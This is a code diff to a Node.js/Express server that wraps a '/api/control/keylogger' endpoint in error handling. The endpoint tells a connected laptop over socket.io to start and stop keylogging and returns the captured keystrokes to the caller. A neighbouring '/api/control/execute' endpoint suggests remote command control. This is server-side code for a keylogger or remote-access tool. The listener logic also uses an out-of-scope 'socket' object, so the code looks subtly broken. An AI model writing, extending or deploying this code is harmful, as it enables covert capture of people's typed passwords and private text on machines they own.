@@ -173,61 +173,77 @@ app.post("/api/control/execute", checkApiKey, (req, res) => {
 
 // API endpoint to take a keylogger tracking
 
-app.post("/api/control/keylogger", checkApiKey, (req, res) => {
-  const { laptopId, duration = 5000 } = req.body;
+app.post("/api/control/keylogger", checkApiKey, async (req, res) => {
+  try {
+    const { laptopId, duration = 5000 } = req.body;
 
-  if (!laptopId) {
-    return res
-      .status(400)
-      .json({ success: false, message: "Laptop ID is required" });
-  }
-
-  const laptop = connectedLaptops.get(laptopId);
-  if (!laptop) {
-    return res
-      .status(404)
-      .json({ success: false, message: "Laptop not found or not connected" });
-  }
-
-  const requestId = Date.now().toString();
-  const collectedKeys = [];
-
-  // Register listener for incoming keys
-  const keyListener = (data) => {
-    if (data && data.requestId === requestId) {
-      collectedKeys.push({
-        key: data.key,
-        keycode: data.keycode,
-        timestamp: data.timestamp,
-      });
+    if (!laptopId) {
+      return res
+        .status(400)
+        .json({ success: false, message: "Laptop ID is required" });
     }
-  };
 
-  // Temporary listener for this keylogging session
-  socket.on("keylog", keyListener);
+    const laptop = connectedLaptops.get(laptopId);
+    if (!laptop) {
+      return res
+        .status(404)
+        .json({ success: false, message: "Laptop not found or not connected" });
+    }
 
-  // Send start keylogging command to laptop
-  io.to(laptopId).emit("command", {
-    type: "keylog-start",
-    requestId,
-  });
+    const requestId = Date.now().toString();
+    const collectedKeys = [];
 
-  // Stop keylogger and respond after duration
-  setTimeout(() => {
-    socket.off("keylog", keyListener); // Stop collecting keys
+    // Register listener for incoming keys
+    const keyListener = (data) => {
+      if (data && data.requestId === requestId) {
+        collectedKeys.push({
+          key: data.key,
+          keycode: data.keycode,
+          timestamp: data.timestamp,
+        });
+      }
+    };
 
-    // Tell the client to stop
+    // Attach listener temporarily
+    socket.on("keylog", keyListener);
+
+    // Start keylogger on laptop
     io.to(laptopId).emit("command", {
-      type: "keylog-stop",
+      type: "keylog-start",
       requestId,
     });
 
-    res.json({
-      success: true,
-      message: `Captured ${collectedKeys.length} keys`,
-      keys: collectedKeys,
+    // Stop keylogger and respond after duration
+    setTimeout(() => {
+      try {
+        socket.off("keylog", keyListener); // Remove listener
+
+        // Stop keylogger on laptop
+        io.to(laptopId).emit("command", {
+          type: "keylog-stop",
+          requestId,
+        });
+
+        res.json({
+          success: true,
+          message: `Captured ${collectedKeys.length} keys`,
+          keys: collectedKeys,
+        });
+      } catch (timeoutErr) {
+        console.error("Error during keylog timeout block:", timeoutErr);
+        res.status(500).json({
+          success: false,
+          message: "Failed to complete keylogging",
+        });
+      }
+    }, duration);
+  } catch (err) {
+    console.error("Keylogger error:", err);
+    res.status(500).json({
+      success: false,
+      message: "Internal server error during keylogging",
     });
-  }, duration);
+  }
 });
 
 io.on("connection", (socket) => {
